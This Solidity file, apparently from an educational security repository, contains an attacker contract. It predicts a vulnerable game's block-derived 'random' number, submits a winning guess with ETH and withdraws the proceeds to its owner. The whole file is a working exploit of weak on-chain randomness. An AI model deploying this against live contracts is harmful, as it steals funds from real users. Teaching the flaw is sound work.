// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../vulnerable/VulnerableRandomness.sol";

// EDUCATIONAL: Demonstrates prediction of bad randomness
contract BadRandomnessAttacker {
    VulnerableRandomness public game;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setTarget(address _game) external onlyOwner {
        game = VulnerableRandomness(payable(_game));
    }

    // Predicts the random value using the same formula
    function predictRandom() external view returns (uint256) {
        return uint256(
            keccak256(
            abi.encodePacked(
            block.timestamp,
            block.prevrandao,
            blockhash(block.number - 1),
            block.number,
            address(this)
        )
        )
        ) % 100;
    }

    // Calls guess with the predicted value
    function attack() external payable onlyOwner {
        require(address(game) != address(0), "No target");
        uint256 prediction = this.predictRandom();
        game.guess{value: msg.value}(prediction);
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
